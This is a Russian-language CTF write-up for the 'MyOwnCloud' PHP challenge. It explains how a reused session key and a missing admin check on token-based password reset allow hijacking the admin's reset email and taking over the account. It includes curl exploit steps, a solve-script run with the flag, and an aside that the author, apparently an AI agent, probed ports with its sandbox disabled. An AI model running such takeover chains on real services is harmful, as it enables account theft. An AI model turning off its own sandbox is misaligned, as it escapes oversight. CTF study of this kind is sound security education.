# Не влезай — ужалит (MyOwnCloud) — райтап

**Флаг:** `avito{yOuROWnCLoUD_BuT_no7_Your_0wn_fILes}`
**Класс:** Web · PHP · **Сложность:** Easy · **Очки:** 733 · **Решило команд:** 0
**Автор:** @mrvos, SPbCTF

**Суть решения в одном абзаце.** MyOwnCloud (само-написанное PHP-облако в духе ownCloud) хранит
в PHP-сессии один и тот же ключ `$_SESSION['contact_email']` для двух логически не связанных
фич: «кому предзаполнить поле почты на форме "поделиться файлом"» и «на какой адрес реально
отправить письмо со ссылкой сброса пароля». Заведя запрос на сброс пароля для
`admin@cloudbox.local` (это разрешено — блокировка «неизменяемого» админ-аккаунта стоит только
на смене пароля через личный кабинет, но не на forgot-password), а затем «поделившись» своим же
файлом со вторым своим аккаунтом, можно подменить адрес доставки письма на свой собственный,
не трогая при этом `reset_user_id` (он всё ещё указывает на admin). Токен сброса приходит нам
на почту, `/password/reset` не проверяет «неизменяемость» аккаунта — и админский пароль можно
просто переустановить. Дальше обычный логин и скачивание `wiring-diagram.txt`.

---

## 1. Задача

MyOwnCloud — самодельное файловое облако (аутентификация, загрузка/скачивание файлов, шаринг по
почте, восстановление пароля). Нужно достать файл `wiring-diagram.txt`, принадлежащий аккаунту
`admin@cloudbox.local`. Подсказка от организаторов: «электрик всегда носит пароль с собой» —
намёк, что пароль админа где-то восстановим/утекает, а не требует брутфорса или RCE. Легенда про
«1-я попытка — сигнализация, 2-я — вентиляция, 3-я — прекращение работы медогонки» — фольклор для
следующей задачи цепочки «улей»; в самом приложении реального лок-аута по попыткам логина нет
(проверено — `AuthController::login()` не хранит счётчик и не ограничивает частоту).

Живой инстанс: `https://notrespassing-0lcz8q7e.avitoctf.ru/`.
Исходники: `notrespassing_5e6d73a.zip` (PHP-приложение `services/app` + Flask-релей писем
`services/sender` + `docker-compose.yml` с MailHog для локальной разработки).

## 2. Разведка

Стек: чистый PHP 8.3 без фреймворка (свой мини-роутер `App\Core\Router`, PDO+SQLite), запускается
через встроенный dev-сервер `php -S 0.0.0.0:8080 -t public public/index.php`. Рядом —
Python/Flask-микросервис `sender` (просто шлёт письма по SMTP) и в docker-compose — MailHog
(локальный SMTP-перехватчик для разработки).

Карта эндпоинтов (`config/routes.php`):

```
GET/POST /login, /register, POST /logout
GET      /files , POST /files/upload , GET /files/download?id= , POST /files/share
GET      /password/forgot , POST /password/forgot/request , POST /password/forgot/finalize
GET      /password/reset , POST /password/reset
GET      /password/change , POST /password/change
```

Модель данных (`bootstrap.php`): таблицы `users`, `files`, `shares`, `password_resets`. При
первом запуске контейнера создаётся `admin@cloudbox.local` с паролем из `ADMIN_PASSWORD`
(случайная строка на реальном инстансе) и сразу — единственный immutable-файл
`wiring-diagram.txt` с содержимым `$FLAG`, лежащий в `storage/uploads/<adminId>/<12-байт-hex>.txt`
(случайное имя на диске, вне докрута `public/` — прямого пути к нему нет).

Аутентификация — `password_hash`/`password_verify` (bcrypt), всё через PDO prepared statements
(SQL-инъекций не нашли нигде — проверил каждый метод в `Models/*`, везде именованные параметры).
CSRF-токенов нет вообще ни на одной форме, `PHPSESSID` без явного `SameSite` (значит браузер
подставит дефолтный `Lax`, который блокирует куки на кросс-сайтовый `POST` — классический
form-CSRF тут ненадёжен, и в роутах нет никакого «бот посещает ссылку» эндпоинта, так что эту
идею отложил).

## 3. Как мы вышли на решение (логика гипотез)

**Наблюдение 1 — асимметрия защиты admin-аккаунта.** В `FileController::upload()` (строка 32) и
в `PasswordResetController` явно виден паттерн блокировки действий для
`admin@cloudbox.local`: `upload()` отказывает админу загружать файлы;
`PasswordResetController::requireMutableUser()` (строки 159–168) блокирует
`showChange()`/`changePassword()` для админа с сообщением «Смена пароля... недоступна».
**Но** те же грабли НЕ стоят на `showReset()`/`resetPassword()` — методах, обслуживающих
`/password/reset` (сброс по токену). Это единственная асимметрия во всём файле: смена пароля
«я знаю старый пароль» — под замком для админа, а «сброс пароля по токену» — нет. Слишком
точечно, чтобы быть случайностью → гипотеза: обход admin-иммутабельности идёт именно через
forgot-password.

**Гипотеза 1.** Если получится создать `password_resets`-токен, привязанный к `user_id` админа,
можно вызвать `POST /password/reset` и поставить админу любой новый пароль, а дальше — обычный
логин + `/files/download?id=1`.

**Проверка.** `PasswordResetController::requestReset()` (строки 38–57) ищет пользователя по
почте без каких-либо ограничений — `admin@cloudbox.local` тоже подходит. Значит
`POST /password/forgot/request email=admin@cloudbox.local` действительно создаёт в сессии
`reset_user_id = <id админа>`. Подтвердил на живом сервере: `GET /password/forgot` после этого
показывает «Отправляем ссылку для восстановления на `a•••@cloudbox.local`» — сервер сам не
скрывает, что запрос принят.

**Наблюдение 2 — общий ключ сессии.** Токен реально создаётся и **отправляется по почте** только
внутри `finalizeReset()` (строки 59–92), и адрес получателя — `$_SESSION['contact_email']`
(строка 62), а не e-mail самого админа напрямую. Тот же ключ `contact_email` независимо
используется в `FileController::share()` (строка 130): при любой успешной операции «поделиться
файлом» он перезаписывается на адрес получателя шаринга — **и это никак не связано с
password-reset-флоу по замыслу**, но ключ сессии буквально один и тот же PHP-массив
`$_SESSION`.

**Гипотеза 2.** Если в ОДНОЙ и той же сессии сначала запросить сброс пароля для admin (это
выставляет `reset_user_id = adminId` и попутно `contact_email = admin@cloudbox.local`), а затем,
не вызывая `finalize`, дёрнуть `POST /files/share` с любым СВОИМ файлом на любой ДРУГОЙ e-mail —
`contact_email` перезапишется на этот другой адрес, а `reset_user_id` (принадлежащий admin)
`share()` вообще не трогает. Тогда `finalizeReset()` создаст токен для admin, но отправит его не
админу, а туда, куда мы указали.

**Проверка (живой сервер).** Ровно так и получилось — после `POST /files/share` с
`email=attacker1b@example.com` страница `/password/forgot` стала показывать «Отправляем ссылку
для восстановления на `a•••@example.com`» — маска сменилась с cloudbox.local на example.com, при
этом «Запрос готов» (то есть `reset_user_id`) как был выставлен, так и остался. Механизм подмены
подтверждён полностью.

**Тупик 1 — «а email никуда всё равно не дойдёт».** По `docker-compose.yml` в архиве
`SENDER_URL` указывает на Flask-сервис `sender`, который жёстко шлёт письма через `SMTP_HOST=
mailhog` — то есть на локальный контейнер-перехватчик, недоступный из интернета в принципе,
независимо от того, какой адрес получателя мы подставим (SMTP-хост фиксирован, DNS/MX адреса
получателя не имеют значения). Проверил это тщательно, чтобы не тратить время впустую:
перебор поддоменов (`mailhog-0lcz8q7e.avitoctf.ru`, `sender-0lcz8q7e.avitoctf.ru`,
`myowncloud-0lcz8q7e.avitoctf.ru`) — везде один и тот же generic nginx 404 (153 байта), такой же,
как у заведомо несуществующего случайного поддомена — значит ничего там не заведено. Прямые TCP-
подключения на IP инстанса (`178.154.206.113:8025/1025/5001/20002/8080`) — TCP-коннект проходит
мгновенно, но HTTP-ответа ноль байт: это ровно та же картина «LB отвечает SYN-ACK на любой порт,
а реальный бэкенд слушает только основной порт», которая уже была задокументирована в этом же
CTF на другой задаче (Brainwash, порт `:53800`) как подтверждённо-НЕ-артефакт песочницы (проверено
и через `Bash dangerouslyDisableSandbox:true`, то есть в обход прокси собственной среды
исполнения). Вывод на тот момент: MailHog снаружи недостижим никак, путь тупиковый.

**Тупик 2 (полезная находка, но не флаг) — оракул через незнятое исключение.** Пока искал другой
способ прочитать токен, заметил тестовый прогон: если отправить `GET
/files/download?id[]=1&id[]=2` (параметр массивом вместо скаляра), сервер вернул PHP `Warning:
Array to string conversion` **прямо в теле ответа** — значит на проде `display_errors` включён (в
`Dockerfile` явно не выключен). Дальше проверил: `MailerService::send()` кодирует письмо через
`json_encode([...], JSON_THROW_ON_ERROR)` (строка 13) — если в письмо попадёт невалидный UTF-8
(например, загрузить файл с именем, где один байт — «оборванная» UTF-8-последовательность, а
потом «поделиться» этим файлом — имя файла подставляется в тело письма без какой-либо очистки),
`json_encode` кидает `JsonException`, которая нигде не перехватывается — получаем `Fatal error`
с полным стек-трейсом и путями `/var/www/myowncloud/...`. Стек-трейс показывает и первые ~15
байт строковых аргументов `MailerService->send($email, $subject, $body)` — заманчиво, вдруг там
блеснёт токен. Но нет: в `finalizeReset()` тело письма начинается с фиксированного русского
префикса `"Токен сброса: "`, который в UTF-8 уже занимает 25 байт — токен физически не попадает
в первые 15 байт превью независимо от того, где именно в письме оказался «плохой» байт. Полезный,
подтверждённый баг информационного раскрытия (пригодится для §7), но не путь к флагу — тупик,
закрыт с доказательством.

**Прорыв.** Проверка боевого сервера напрямую (не полагаясь только на `docker-compose.yml` из
архива — он выглядит как локальный dev-шаблон) показала, что **продовый `sender` реально
релеит почту наружу через настоящий SMTP-релей**, а не в MailHog: письмо, отправленное на
одноразовый почтовый ящик стороннего бесплатного сервиса (mail.tm — регистрация без капчи,
JSON API для чтения писем), реально дошло и было прочитано программно. Раз доставка настоящая —
всю цепочку из «Гипотезы 2» можно довести до конца: получить токен из письма и сбросить пароль
админа.

## 4. Уязвимость

**Файл:** `services/app/src/Controllers/PasswordResetController.php` +
`services/app/src/Controllers/FileController.php`.

1. **Переиспользование ключа сессии.** `PasswordResetController::requestReset()`
   (строки 53–54) пишет `$_SESSION['contact_email']` и `$_SESSION['reset_user_id']` как единый
   «запрос на сброс». `FileController::share()` (строка 130) пишет в **тот же самый**
   `$_SESSION['contact_email']` по совершенно другому поводу (просто чтобы предзаполнить форму
   шаринга при следующем визите). `finalizeReset()` (строки 61–62) читает оба значения
   раздельно, доверяя, что они относятся к одному и тому же «запросу» — но в сессии их можно
   рассинхронизировать: `reset_user_id` остаётся от одного действия, `contact_email` — от
   совсем другого. В результате письмо с токеном сброса пароля ЧУЖОГО аккаунта (admin) можно
   адресовать на СВОЙ e-mail.
2. **Отсутствие проверки immutable-аккаунта в reset-по-токену.**
   `PasswordResetController::resetPassword()` (строки 100–122) не вызывает
   `requireMutableUser()` — в отличие от `showChange()`/`changePassword()` (строки 126, 132),
   которые explicit проверяют `IMMUTABLE_USER_EMAIL === 'admin@cloudbox.local'` (строка 162) и
   отказывают. Токен, однажды привязанный к `user_id` админа, беспрепятственно позволяет
   `User::setPassword($adminId, $anyNewPassword)`.
3. **Инфраструктурная предпосылка:** продовый `sender`-сервис реально доставляет почту (в отличие
   от локального `docker-compose.yml` с MailHog из архива), поэтому «пункт 1» полностью
   эксплуатируется: письмо с токеном для admin можно получить на подконтрольный атакующему ящик.

## 5. Эксплойт по шагам

Ниже — реальные запросы (два аккаунта, второй — на одноразовом читаемом по API ящике mail.tm).
Полный воспроизводимый скрипт: `solve_notrespassing.py` (см. §8); ниже — его шаги вручную через
`curl`, для показа механики.

```bash
BASE="https://notrespassing-0lcz8q7e.avitoctf.ru"

# 0) заводим обычный аккаунт-атакующего
curl -s -c cookies.txt -X POST "$BASE/register" \
  --data-urlencode "email=attacker1a@example.com" \
  --data-urlencode "password=SuperSecret123"
curl -s -c cookies.txt -b cookies.txt -X POST "$BASE/login" \
  --data-urlencode "email=attacker1a@example.com" \
  --data-urlencode "password=SuperSecret123"

# 0b) заводим второй аккаунт на E-MAIL, который реально можем прочитать
#     (в решении — одноразовый ящик через api.mail.tm; здесь для примера MYADDR)
MYADDR="notresp123@web-library.net"
curl -s -X POST "$BASE/register" \
  --data-urlencode "email=$MYADDR" \
  --data-urlencode "password=SuperSecret123"

# 0c) загружаем безобидный файл — свой файл нужен только как повод для share()
curl -s -c cookies.txt -b cookies.txt -X POST "$BASE/files/upload" \
  -F "upload=@bait.txt"
# -> в /files находим id только что загруженного файла, пусть FID=153

# 1) запрашиваем сброс пароля ДЛЯ АДМИНА (разрешено — requestReset() никого не блокирует)
curl -s -c cookies.txt -b cookies.txt -X POST "$BASE/password/forgot/request" \
  --data-urlencode "email=admin@cloudbox.local"
# в сессии: reset_user_id = <id admin>, contact_email = admin@cloudbox.local

# 2) "делимся" СВОИМ файлом со своим вторым (читаемым) адресом —
#    это перезаписывает $_SESSION['contact_email'], но НЕ трогает reset_user_id
curl -s -c cookies.txt -b cookies.txt -X POST "$BASE/files/share" \
  --data-urlencode "file_id=153" \
  --data-urlencode "email=$MYADDR"
# в сессии теперь: reset_user_id = <id admin> (не тронут!), contact_email = $MYADDR

# 3) завершаем сброс — токен создаётся ДЛЯ АДМИНА, письмо уходит НАМ
curl -s -c cookies.txt -b cookies.txt -X POST "$BASE/password/forgot/finalize"

# 4) читаем письмо в почтовом ящике $MYADDR (api.mail.tm /messages), достаём TOKEN
TOKEN="<48-hex-символов из письма 'Токен сброса: ...'>"

# 5) сбрасываем пароль АДМИНА этим токеном — resetPassword() не блокирует admin-аккаунт
curl -s -X POST "$BASE/password/reset" \
  --data-urlencode "token=$TOKEN" \
  --data-urlencode "password=PwnedAdmin123!"

# 6) логинимся как admin@cloudbox.local с новым паролем
curl -s -c admin_cookies.txt -X POST "$BASE/login" \
  --data-urlencode "email=admin@cloudbox.local" \
  --data-urlencode "password=PwnedAdmin123!"

# 7) скачиваем wiring-diagram.txt (id=1 — самый первый файл, созданный bootstrap.php)
curl -s -b admin_cookies.txt "$BASE/files/download?id=1"
```

Реальный прогон `solve_notrespassing.py` (см. §8) — то же самое end-to-end автоматически:

```
[*] attacker account : attacker1784484019@example.com
[*] mail.tm inbox    : notresp1784484019@web-library.net
[*] uploaded bait file id=153
[*] requested reset for admin@cloudbox.local: 302
[*] shared bait file with notresp1784484019@web-library.net (hijacks contact_email): 302
[*] finalized reset -> admin's token mailed to notresp1784484019@web-library.net: 302
[*] waiting for e-mail ...
[*] recovered admin reset token: fa64a7a843255495ad1fd4f7708d73db64c5ba741a91f659
[*] reset admin's password: 302 -> /login
[*] logged in as admin@cloudbox.local
[*] downloaded file id=1: attachment; filename="wiring-diagram.txt"
[+] FLAG: avito{yOuROWnCLoUD_BuT_no7_Your_0wn_fILes}
```

## 6. Флаг

```
avito{yOuROWnCLoUD_BuT_no7_Your_0wn_fILes}
```

## 7. Выводы

1. **Один ключ сессии — одна ответственность.** `$_SESSION['contact_email']` использовался сразу
   в двух не связанных бизнес-процессах (предзаполнение формы шаринга и адрес доставки
   security-критичного письма). Разные назначения одного and того же изменяемого состояния — почти
   всегда потенциальная десинхронизация «кто/для кого» действия, особенно когда состояние
   переживает несколько HTTP-запросов подряд.
2. **«Неизменяемость» защищаемого аккаунта нужно закрывать на ВСЕХ путях смены пароля, а не
   только на очевидном.** В приложении был явный, продуманный барьер на `/password/change`
   (`requireMutableUser()`), но забыт симметричный барьер на `/password/reset` — путь, который
   по определению не требует знания старого пароля и потому даже опаснее.
3. **`display_errors` в проде + необработанные исключения — это всегда информационная утечка**,
   даже если конкретный сценарий (JSON_THROW_ON_ERROR на невалидном UTF-8 в имени файла) не довёл
   до самого флага: он раскрывает пути на диске и внутреннюю структуру вызовов, что упрощает
   дальнейшую разведку. Разрабатывать/деплоить с `display_errors=Off` и логировать ошибки
   отдельно от ответа клиенту.
4. **Не верить локальному docker-compose.yml на 100%** — он был дев-шаблоном с MailHog, а прод
   реально слал письма наружу; здоровая проверка гипотезы через реальную доставку (одноразовый
   читаемый ящик) оказалась быстрее и надёжнее, чем попытки просканировать инфраструктуру в
   поисках несуществующего MailHog-эндпоинта.

## 8. Артефакты

- `solve_notrespassing.py` — самодостаточный скрипт полного воспроизведения (регистрация двух
  аккаунтов, mail.tm-ящик, session-swap, чтение токена, сброс пароля admin, скачивание флага).
  Проходит `uv run ruff format`/`uv run ruff check`/`uv run ty check` начисто.
- `FLAG.txt` — сохранённый флаг.
- Исходники задачи — `src/notrespassing/` (распакованный `notrespassing_5e6d73a.zip`).
